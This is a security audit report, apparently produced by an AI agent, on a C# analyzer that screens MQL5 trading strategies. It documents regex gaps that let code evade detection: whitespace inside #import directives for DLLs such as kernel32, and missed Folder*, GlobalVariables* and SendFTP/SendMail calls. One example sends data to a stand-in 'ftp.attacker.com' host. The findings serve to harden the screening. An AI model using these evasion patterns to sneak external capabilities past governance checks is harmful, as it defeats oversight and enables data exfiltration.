---
agent_id: E08
lane: E08 - Mql5 Static Inventory & Compile Package Planner
scope:
  - src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5StaticInventory.cs
  - src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5StaticInventoryAnalyzer.cs
  - src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5CompilePackageDossierPlanner.cs
  - src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5CompilePackagePlanFormatter.cs
  - src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5InventoryFormatter.cs
status: COMPLETE
generated: 2026-08-29T11:28:00Z
counts: { P0: 1, P1: 4, P2: 2, P3: 0 }
---

# E08 — Mql5 Static Inventory & Compile Package Planner

## Scope audited
- `src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5StaticInventory.cs` (102 lines)
- `src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5StaticInventoryAnalyzer.cs` (1069 lines)
- `src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5CompilePackageDossierPlanner.cs` (1148 lines)
- `src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5CompilePackagePlanFormatter.cs` (32 lines)
- `src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5InventoryFormatter.cs` (166 lines)

## Verdict
The static inventory pipeline and package dossier planner exhibit rigorous cryptographic verification, deterministic sorting invariants across hash maps, and comprehensive Markdown escaping against table injection. However, static inventory detection relies on line-anchored regular expressions that permit governance evasion via preprocessor whitespace styling (`#  import`), miss pluralized MQL5 runtime global APIs (`GlobalVariablesTotal`), and omit standard MQL5 folder (`FolderCreate`) and communication (`SendFTP`, `SendMail`) APIs. These omissions allow uninventoried external dependencies and prohibited capabilities to bypass static screening.

## Findings

### [P0] Preprocessor Directive Whitespace Evasion Bypasses Native DLL and Include Governance
- **Where:** `src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5StaticInventoryAnalyzer.cs:1060-1064`
- **Confidence:** CONFIRMED
- **Code:**
  ```csharp
      [GeneratedRegex("(?m)^[\\t ]*#include[\\t ]*(?<open>[<\\\"])(?<path>[^>\\\"\\r\\n]+)[>\\\"]", RegexOptions.CultureInvariant)]
      private static partial Regex IncludeDirectiveRegex();

      [GeneratedRegex("(?m)^[\\t ]*#import[\\t ]*\\\"(?<path>[^\\\"\\r\\n]+)\\\"", RegexOptions.CultureInvariant)]
      private static partial Regex ImportDirectiveRegex();
  ```
- **Failure:** In valid MQL5 and C preprocessor syntax, arbitrary whitespace is valid between `#` and the directive token (e.g. `#  import "user32.dll"` or `#\tinclude "payload.mqh"`). `ImportDirectiveRegex` and `IncludeDirectiveRegex` mandate `^[\t ]*#import` and `^[\t ]*#include` without whitespace between `#` and the keyword. An untrusted strategy containing `#  import "kernel32.dll"` completely bypasses import detection: no `NATIVE_OR_EXTERNAL_IMPORT` feature or `DLL_OR_EXTERNAL_IMPORT_UNSUPPORTED` finding is emitted, leaving the file's static disposition as `NeedsSemanticValidation` rather than `Unsupported`.
- **Fix:** Update `IncludeDirectiveRegex`, `ImportDirectiveRegex`, and `ResourceDirectiveRegex` to allow optional whitespace between the leading `#` and the directive keyword (e.g. `(?m)^[\t ]*#[\t ]*import[\t ]*\"...\"`).

### [P1] Missed Plural Global Variable Built-ins in Terminal Globals Detection
- **Where:** `src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5StaticInventoryAnalyzer.cs:1027-1028`
- **Confidence:** CONFIRMED
- **Code:**
  ```csharp
      [GeneratedRegex(@"\bGlobalVariable(?:Check|Time|Del|Get|Name|Set|SetOnCondition|Temp|Total|DeleteAll)?\s*\(", RegexOptions.CultureInvariant | RegexOptions.ExplicitCapture)]
      private static partial Regex TerminalGlobalsRegex();
  ```
- **Failure:** Standard MQL5 runtime functions for global variable manipulation use plural identifiers: `GlobalVariablesTotal()`, `GlobalVariablesFlush()`, and `GlobalVariablesDeleteAll(...)`. Because `TerminalGlobalsRegex` searches for singular `GlobalVariable(?:...Total|DeleteAll)` and omits `Flush`, calls to `GlobalVariablesTotal()`, `GlobalVariablesFlush()`, and `GlobalVariablesDeleteAll(...)` fail to match. The file is not flagged with `PERSISTED_TERMINAL_GLOBALS` or `TERMINAL_GLOBAL_VARIABLES_UNSUPPORTED` and escapes the `Unsupported` disposition check.
- **Fix:** Change `TerminalGlobalsRegex` to `\bGlobalVariables?(?:Check|Time|Del|Get|Name|Set|SetOnCondition|Temp|Total|DeleteAll|Flush)?\s*\(`.

### [P1] Missed `Folder*` File System APIs in File IO Detection
- **Where:** `src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5StaticInventoryAnalyzer.cs:1012-1013`
- **Confidence:** CONFIRMED
- **Code:**
  ```csharp
      [GeneratedRegex(@"\bFile(?:Open|Read|Write|Seek|Tell|Size|Flush|Close|Delete|Move|Copy|IsExist|FindFirst|FindNext|FindClose)\w*\s*\(", RegexOptions.CultureInvariant | RegexOptions.ExplicitCapture)]
      private static partial Regex FileIoRegex();
  ```
- **Failure:** Standard MQL5 folder-manipulation built-in functions `FolderCreate(...)`, `FolderDelete(...)`, and `FolderClean(...)` (catalogued in `Mql5BuiltinSignatures` as unsupported File built-ins) do not begin with the `File` prefix and are not matched by `FileIoRegex`. A strategy calling `FolderDelete("...")` or `FolderCreate("...")` produces no `FILE_IO` feature and no `ARBITRARY_FILE_IO_UNSUPPORTED` finding, allowing prohibited filesystem mutations to pass static analysis.
- **Fix:** Update `FileIoRegex` to include `Folder(?:Create|Delete|Clean)` alongside `File(?:...)`.

### [P1] Missed `SendFTP`, `SendMail`, and `SendNotification` in Network IO Detection
- **Where:** `src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5StaticInventoryAnalyzer.cs:1015-1016`
- **Confidence:** CONFIRMED
- **Code:**
  ```csharp
      [GeneratedRegex(@"\b(?:WebRequest|SocketCreate|SocketConnect|SocketSend|SocketRead|SocketTlsHandshake|SocketClose)\s*\(", RegexOptions.CultureInvariant | RegexOptions.ExplicitCapture)]
      private static partial Regex NetworkIoRegex();
  ```
- **Failure:** MQL5 provides native communication built-ins `SendFTP(...)`, `SendMail(...)`, and `SendNotification(...)` for exfiltrating data outside the local terminal. `NetworkIoRegex` only captures `WebRequest` and `Socket*` calls. A strategy calling `SendFTP("ftp.attacker.com", ...)` or `SendMail(...)` generates no `NETWORK_IO` feature or `NETWORK_ACCESS_UNSUPPORTED` finding, bypassing static network prohibition gates.
- **Fix:** Add `SendFTP`, `SendMail`, and `SendNotification` to `NetworkIoRegex`.

### [P1] WinAPI Sub-Headers Under-Reported as `NeedsSource` Instead of `Unsupported` OS Include
- **Where:** `src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5StaticInventoryAnalyzer.cs:590-595`
- **Confidence:** CONFIRMED
- **Code:**
  ```csharp
      private static bool IsOperatingSystemInclude(string path)
      {
          return path.Contains("WinUser", StringComparison.OrdinalIgnoreCase)
              || path.Contains("kernel32", StringComparison.OrdinalIgnoreCase)
              || path.Contains("shell32", StringComparison.OrdinalIgnoreCase);
      }
  ```
- **Failure:** Standard MetaTrader Windows integration headers under `<WinAPI\...>` (e.g. `<WinAPI\fileapi.mqh>`, `<WinAPI\processthreadsapi.mqh>`, `<WinAPI\sysinfoapi.mqh>`) do not contain the substring `WinUser`, `kernel32`, or `shell32`, nor are they catalogued in `IsKnownPlatformInclude`. The static analyzer resolves them as `Mql5IncludeResolution.MissingSource` (status `NeedsSource`) instead of `OPERATING_SYSTEM_INCLUDE_UNSUPPORTED` (`Unsupported`). If the strategy author provides local stub files matching those relative paths, the corpus resolves them as `ResolvedInCorpus`, allowing OS integration headers to bypass unsupported classification.
- **Fix:** Expand `IsOperatingSystemInclude` to match `WinAPI`, `winapi.mqh`, `user32`, `advapi32`, and all Windows API standard include headers.

### [P2] `Mql5InventoryFormatter` Over-Reports Finding File Counts on Multiple Findings Per File
- **Where:** `src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5InventoryFormatter.cs:77-87`
- **Confidence:** CONFIRMED
- **Code:**
  ```csharp
          foreach (var group in manifest.Files
                       .SelectMany(static file => file.Findings)
                       .GroupBy(static finding => (finding.Code, finding.Severity, finding.Support))
                       .OrderByDescending(static group => group.Key.Severity)
                       .ThenBy(static group => group.Key.Code, StringComparer.Ordinal))
          {
              report.Append("| ").Append(Mql5MarkdownEscaper.EscapeTableCell(group.Key.Code))
                  .Append(" | ").Append(group.Key.Severity)
                  .Append(" | ").Append(group.Key.Support)
                  .Append(" | ").Append(group.Count())
                  .AppendLine(" |");
          }
  ```
- **Failure:** In the Markdown finding inventory table, the count column header is labeled `Files`. However, `group.Count()` calculates the total number of `Mql5CompatibilityFinding` instances across all files in that grouping. If a single file contains 5 missing include findings (`INCLUDE_SOURCE_MISSING`), `group.Count()` evaluates to `5`, falsely reporting in the `Files` column that 5 files have the finding rather than 1 file with 5 occurrences.
- **Fix:** Calculate distinct file count across the group (e.g. counting distinct `file.RelativePath` containing the finding) or rename the Markdown column header to `Findings` / `Occurrences`.

### [P2] Multi-declaration and Inline `input` Parameters Undercounted by `InputDeclarationRegex`
- **Where:** `src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5StaticInventoryAnalyzer.cs:997-998`
- **Confidence:** CONFIRMED
- **Code:**
  ```csharp
      [GeneratedRegex(@"(?m)^[\t ]*(?:input|sinput)\b", RegexOptions.CultureInvariant | RegexOptions.ExplicitCapture)]
      private static partial Regex InputDeclarationRegex();
  ```
- **Failure:** `InputDeclarationRegex` is anchored to line start with `(?m)^[\t ]*`. If multiple input parameters are declared on the same line (e.g. `input int Fast = 10; input int Slow = 20;`) or follow other inline statements (`int dummy = 0; input double Risk = 1.5;`), only the leading declaration (or none) matches. `OccurrenceCount` and the reported feature line array undercount the true number of declared strategy inputs.
- **Fix:** Remove the line anchor `(?m)^[\t ]*` and match word boundary `\b(?:input|sinput)\b` across `codeOnly`.

## Referrals
None.

## Coverage gaps
- `src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5StaticInventoryAnalyzer.cs:227-235` — The `decoded.EncodingName == "windows-1252"` branch emitting `SOURCE_WINDOWS_1252_ENCODING_REQUIRES_REVIEW` is not covered by tests in `Mql5StaticInventoryTests.cs`.
- `src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5StaticInventoryAnalyzer.cs:246-255` — The `ForbiddenControlCharacterCount > 0` branch emitting `SOURCE_FORBIDDEN_CONTROL_CHARACTERS` on textual payloads is not covered by tests.
- `src/Modules/StrategyGovernance/YO4X.StrategyGovernance/Mql5StaticInventoryAnalyzer.cs:768-786` — Branches detecting indicator and script entrypoints (`OnCalculate` emitting `CUSTOM_INDICATOR_PROGRAM_UNSUPPORTED` and `OnStart` emitting `SCRIPT_PROGRAM_UNSUPPORTED`) lack unit test verification.


--- agy: gemini-3.7-flash-high | effort=high | mode=plan (read-only) | 148.0s | 283455 tok | id=8b2ee018-d61f-4dfb-a4b1-516548477eb8
